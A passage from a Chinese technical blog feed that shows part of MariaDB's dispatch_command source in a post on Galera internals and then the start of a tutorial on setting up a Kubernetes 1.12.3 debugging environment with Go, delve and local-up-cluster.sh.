class="keyword">break</span>;</span><br><span class="line">    thd-&gt;mdl_context.release_transactional_locks();</span><br><span class="line">    <span class="keyword">if</span> (check_global_access(thd,RELOAD_ACL))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    general_log_print(thd, command, NullS);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DBUG_OFF</span></span><br><span class="line">    <span class="keyword">bool</span> debug_simulate= FALSE;</span><br><span class="line">    DBUG_EXECUTE_IF(<span class="string">"simulate_detached_thread_refresh"</span>, debug_simulate= TRUE;);</span><br><span class="line">    <span class="keyword">if</span> (debug_simulate)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Simulate a reload without a attached thread session.</span></span><br><span class="line"><span class="comment">        Provides a environment similar to that of when the</span></span><br><span class="line"><span class="comment">        server receives a SIGHUP signal and reloads caches</span></span><br><span class="line"><span class="comment">        and flushes tables.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">bool</span> res;</span><br><span class="line">      set_current_thd(<span class="number">0</span>);</span><br><span class="line">      res= reload_acl_and_cache(<span class="literal">NULL</span>, options | REFRESH_FAST,</span><br><span class="line">                                <span class="literal">NULL</span>, &amp;not_used);</span><br><span class="line">      set_current_thd(thd);</span><br><span class="line">      <span class="keyword">if</span> (res)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">#endif</span><br><span class="line">    &#123;</span><br><span class="line">      thd-&gt;lex-&gt;relay_log_connection_name= empty_lex_str;</span><br><span class="line">      <span class="keyword">if</span> (reload_acl_and_cache(thd, options, (TABLE_LIST*) <span class="number">0</span>, &amp;not_used))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (trans_commit_implicit(thd))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    close_thread_tables(thd);</span><br><span class="line">    thd-&gt;mdl_context.release_transactional_locks();</span><br><span class="line">    my_ok(thd);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> EMBEDDED_LIBRARY</span></span><br><span class="line">  <span class="keyword">case</span> COM_SHUTDOWN:</span><br><span class="line">  &#123;</span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_other);</span><br><span class="line">    <span class="keyword">if</span> (check_global_access(thd,SHUTDOWN_ACL))</span><br><span class="line">      <span class="keyword">break</span>; <span class="comment">/* purecov: inspected */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the client is &lt; 4.1.3, it is going to send us no argument; then</span></span><br><span class="line"><span class="comment">      packet_length is 0, packet[0] is the end 0 of the packet. Note that</span></span><br><span class="line"><span class="comment">      SHUTDOWN_DEFAULT is 0. If client is &gt;= 4.1.3, the shutdown level is in</span></span><br><span class="line"><span class="comment">      packet[0].</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">enum</span> mysql_enum_shutdown_level level;</span><br><span class="line">    level= (<span class="keyword">enum</span> mysql_enum_shutdown_level) (uchar) packet[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (level == SHUTDOWN_DEFAULT)</span><br><span class="line">      level= SHUTDOWN_WAIT_ALL_BUFFERS; <span class="comment">// soon default will be configurable</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (level != SHUTDOWN_WAIT_ALL_BUFFERS)</span><br><span class="line">    &#123;</span><br><span class="line">      my_error(ER_NOT_SUPPORTED_YET, MYF(<span class="number">0</span>), <span class="string">"this shutdown level"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DBUG_PRINT(<span class="string">"quit"</span>,(<span class="string">"Got shutdown command for level %u"</span>, level));</span><br><span class="line">    general_log_print(thd, command, NullS);</span><br><span class="line">    my_eof(thd);</span><br><span class="line">    kill_mysql();</span><br><span class="line">    error=TRUE;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">case</span> COM_STATISTICS:</span><br><span class="line">  &#123;</span><br><span class="line">    STATUS_VAR *current_global_status_var;      <span class="comment">// Big; Don't allocate on stack</span></span><br><span class="line">    ulong uptime;</span><br><span class="line">    uint length __attribute__((unused));</span><br><span class="line">    ulonglong queries_per_second1000;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">250</span>];</span><br><span class="line">    uint buff_len= <span class="keyword">sizeof</span>(buff);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(current_global_status_var= (STATUS_VAR*)</span><br><span class="line">          thd-&gt;alloc(<span class="keyword">sizeof</span>(STATUS_VAR))))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    general_log_print(thd, command, NullS);</span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_SHOW_STATUS]);</span><br><span class="line">    calc_sum_of_all_status(current_global_status_var);</span><br><span class="line">    <span class="keyword">if</span> (!(uptime= (ulong) (thd-&gt;start_time - server_start_time)))</span><br><span class="line">      queries_per_second1000= <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      queries_per_second1000= thd-&gt;query_id * <span class="number">1000</span> / uptime;</span><br><span class="line"></span><br><span class="line">    length= my_snprintf(buff, buff_len - <span class="number">1</span>,</span><br><span class="line">                        <span class="string">"Uptime: %lu  Threads: %d  Questions: %lu  "</span></span><br><span class="line">                        <span class="string">"Slow queries: %lu  Opens: %lu  Flush tables: %lu  "</span></span><br><span class="line">                        <span class="string">"Open tables: %u  Queries per second avg: %u.%03u"</span>,</span><br><span class="line">                        uptime,</span><br><span class="line">                        (<span class="keyword">int</span>) thread_count, (ulong) thd-&gt;query_id,</span><br><span class="line">                        current_global_status_var-&gt;long_query_count,</span><br><span class="line">                        current_global_status_var-&gt;opened_tables,</span><br><span class="line">                        tdc_refresh_version(),</span><br><span class="line">                        tc_records(),</span><br><span class="line">                        (uint) (queries_per_second1000 / <span class="number">1000</span>),</span><br><span class="line">                        (uint) (queries_per_second1000 % <span class="number">1000</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> EMBEDDED_LIBRARY</span></span><br><span class="line">    <span class="comment">/* Store the buffer in permanent memory */</span></span><br><span class="line">    my_ok(thd, <span class="number">0</span>, <span class="number">0</span>, buff);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    (<span class="keyword">void</span>) my_net_write(net, (uchar*) buff, length);</span><br><span class="line">    (<span class="keyword">void</span>) net_flush(net);</span><br><span class="line">    thd-&gt;get_stmt_da()-&gt;disable_status();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_PING:</span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_other);</span><br><span class="line">    my_ok(thd);<span class="comment">// Tell client we are alive</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> COM_PROCESS_INFO:</span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_SHOW_PROCESSLIST]);</span><br><span class="line">    <span class="keyword">if</span> (!thd-&gt;security_ctx-&gt;priv_user[<span class="number">0</span>] &amp;&amp;</span><br><span class="line">        check_global_access(thd, PROCESS_ACL))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    general_log_print(thd, command, NullS);</span><br><span class="line">    mysqld_list_processes(thd,</span><br><span class="line">  thd-&gt;security_ctx-&gt;master_access &amp; PROCESS_ACL ? </span><br><span class="line">  NullS : thd-&gt;security_ctx-&gt;priv_user, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> COM_PROCESS_KILL:</span><br><span class="line">  &#123;</span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_KILL]);</span><br><span class="line">    ulong id=(ulong) uint4korr(packet);</span><br><span class="line">    sql_kill(thd, id, KILL_CONNECTION_HARD, KILL_TYPE_ID);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_SET_OPTION:</span><br><span class="line">  &#123;</span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_SET_OPTION]);</span><br><span class="line">    uint opt_command= uint2korr(packet);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt_command) &#123;</span><br><span class="line">    <span class="keyword">case</span> (<span class="keyword">int</span>) MYSQL_OPTION_MULTI_STATEMENTS_ON:</span><br><span class="line">      thd-&gt;client_capabilities|= CLIENT_MULTI_STATEMENTS;</span><br><span class="line">      my_eof(thd);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> (<span class="keyword">int</span>) MYSQL_OPTION_MULTI_STATEMENTS_OFF:</span><br><span class="line">      thd-&gt;client_capabilities&amp;= ~CLIENT_MULTI_STATEMENTS;</span><br><span class="line">      my_eof(thd);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd, ER_UNKNOWN_COM_ERROR),</span><br><span class="line">                 MYF(<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_DEBUG:</span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_other);</span><br><span class="line">    <span class="keyword">if</span> (check_global_access(thd, SUPER_ACL))</span><br><span class="line">      <span class="keyword">break</span>;<span class="comment">/* purecov: inspected */</span></span><br><span class="line">    mysql_print_status();</span><br><span class="line">    general_log_print(thd, command, NullS);</span><br><span class="line">    my_eof(thd);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> COM_SLEEP:</span><br><span class="line">  <span class="keyword">case</span> COM_CONNECT:<span class="comment">// Impossible here</span></span><br><span class="line">  <span class="keyword">case</span> COM_TIME:<span class="comment">// Impossible from client</span></span><br><span class="line">  <span class="keyword">case</span> COM_DELAYED_INSERT:</span><br><span class="line">  <span class="keyword">case</span> COM_END:</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd, ER_UNKNOWN_COM_ERROR),</span><br><span class="line">               MYF(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WITH_WSREP</span></span><br><span class="line"> dispatch_end:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (WSREP(thd))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* wsrep BF abort in query exec phase */</span></span><br><span class="line">    mysql_mutex_lock(&amp;thd-&gt;LOCK_wsrep_thd);</span><br><span class="line">    do_end_of_statement= thd-&gt;wsrep_conflict_state != REPLAYING &amp;&amp;</span><br><span class="line">                         thd-&gt;wsrep_conflict_state != RETRY_AUTOCOMMIT;</span><br><span class="line">    mysql_mutex_unlock(&amp;thd-&gt;LOCK_wsrep_thd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    do_end_of_statement= <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WITH_WSREP */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (do_end_of_statement)</span><br><span class="line">  &#123;</span><br><span class="line">    DBUG_ASSERT(thd-&gt;derived_tables == <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">               (thd-&gt;open_tables == <span class="literal">NULL</span> ||</span><br><span class="line">               (thd-&gt;locked_tables_mode == LTM_LOCK_TABLES)));</span><br><span class="line"></span><br><span class="line">    thd_proc_info(thd, <span class="string">"updating status"</span>);</span><br><span class="line">    <span class="comment">/* Finalize server status flags after executing a command. */</span></span><br><span class="line">    thd-&gt;update_server_status();</span><br><span class="line">    thd-&gt;protocol-&gt;end_statement();</span><br><span class="line">    query_cache_end_of_result(thd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!thd-&gt;is_error() &amp;&amp; !thd-&gt;killed_errno())</span><br><span class="line">    mysql_audit_general(thd, MYSQL_AUDIT_GENERAL_RESULT, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  mysql_audit_general(thd, MYSQL_AUDIT_GENERAL_STATUS,</span><br><span class="line">                      thd-&gt;get_stmt_da()-&gt;is_error() ?</span><br><span class="line">                      thd-&gt;get_stmt_da()-&gt;sql_errno() : <span class="number">0</span>,</span><br><span class="line">                      command_name[command].str);</span><br><span class="line"></span><br><span class="line">  thd-&gt;update_all_stats();</span><br><span class="line"></span><br><span class="line">  log_slow_statement(thd);</span><br><span class="line"></span><br><span class="line">  THD_STAGE_INFO(thd, stage_cleaning_up);</span><br><span class="line">  thd-&gt;reset_query();</span><br><span class="line">  thd-&gt;set_examined_row_count(<span class="number">0</span>);                   <span class="comment">// For processlist</span></span><br><span class="line">  thd-&gt;set_command(COM_SLEEP);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Performance Schema Interface instrumentation, end */</span></span><br><span class="line">  MYSQL_END_STATEMENT(thd-&gt;m_statement_psi, thd-&gt;get_stmt_da());</span><br><span class="line">  thd-&gt;m_statement_psi= <span class="literal">NULL</span>;</span><br><span class="line">  thd-&gt;m_digest= <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  dec_thread_running();</span><br><span class="line">  thd-&gt;packet.shrink(thd-&gt;variables.net_buffer_length);<span class="comment">// Reclaim some memory</span></span><br><span class="line">  free_root(thd-&gt;mem_root,MYF(MY_KEEP_PREALLOC));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ENABLED_PROFILING)</span></span><br><span class="line">  thd-&gt;profiling.finish_current_query();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (MYSQL_QUERY_DONE_ENABLED() || MYSQL_COMMAND_DONE_ENABLED())</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> res __attribute__((unused));</span><br><span class="line">    res= (<span class="keyword">int</span>) thd-&gt;is_error();</span><br><span class="line">    <span class="keyword">if</span> (command == COM_QUERY)</span><br><span class="line">    &#123;</span><br><span class="line">      MYSQL_QUERY_DONE(res);</span><br><span class="line">    &#125;</span><br><span class="line">    MYSQL_COMMAND_DONE(res);</span><br><span class="line">  &#125;</span><br><span class="line">  DEBUG_SYNC(thd,<span class="string">"dispatch_command_end"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check that some variables are reset properly */</span></span><br><span class="line">  DBUG_ASSERT(thd-&gt;abort_on_warning == <span class="number">0</span>);</span><br><span class="line">  thd-&gt;lex-&gt;restore_set_statement_var();</span><br><span class="line">  DBUG_RETURN(error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面查询语句的时候，在mysql_parse函数之前做了检查。</p><p>未完待续</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;galera原理和源码学习&quot;&gt;&lt;a href=&quot;#galera原理和源码学习&quot; class=&quot;headerlink&quot; title=&quot;galera原理和源码学习&quot;&gt;&lt;/a&gt;galera原理和源码学习&lt;/h2&gt;&lt;h3 id=&quot;源码架构&quot;&gt;&lt;a href=&quot;#源码架构&quot;
      
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.yorzorzy.xyz/categories/mysql/"/>
    
    
      <category term="galera" scheme="http://www.yorzorzy.xyz/tags/galera/"/>
    
  </entry>
  
  <entry>
    <title>kubernetes debug环境搭建</title>
    <link href="http://www.yorzorzy.xyz/2020/03/02/kubernetes_debug%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://www.yorzorzy.xyz/2020/03/02/kubernetes_debug%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-03-02T10:25:56.103Z</published>
    <updated>2020-03-02T10:25:02.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="kubernetes-debug环境搭建"><a href="#kubernetes-debug环境搭建" class="headerlink" title="kubernetes debug环境搭建"></a>kubernetes debug环境搭建</h3><p>k8s debug环境搭建</p><h4 id="环境安装："><a href="#环境安装：" class="headerlink" title="环境安装："></a>环境安装：</h4><p>go 1.12版本，1.13版本太高，k8s编译有点问题。</p><p>k8s 1.12.3版本</p><p>centos 7安装 k8s，进行调试，使用dlv进行调试</p><p>安装必须要的组件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y docker wget curl vim golang etcd openssl git</span><br><span class="line">systemctl enable docker &amp;&amp; systemctl start docker</span><br></pre></td></tr></table></figure><p>设置gopath路径，之后安装好必须要的库</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u -v github.com/cloudflare/cfssl/cmd/...</span><br></pre></td></tr></table></figure><p>安装delve调试工具</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u -v github.com/derekparker/delve/cmd/dlv</span><br></pre></td></tr></table></figure> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/kubernetes/kubernetes.git $GOPATH/src/k8s.io/kubernetes</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b v1<span class="number">.12</span><span class="number">.3</span></span><br></pre></td></tr></table></figure><p>运行脚本安装和运行</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp hack/local-up-cluster.sh hack/local-up-cluster.sh.bak</span><br><span class="line">touch hack/local-up-cluster.sh &amp;&amp; chmod +x hack/local-up-cluster.sh</span><br></pre></td></tr></table></figure><p>使用下面脚本安装和运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span 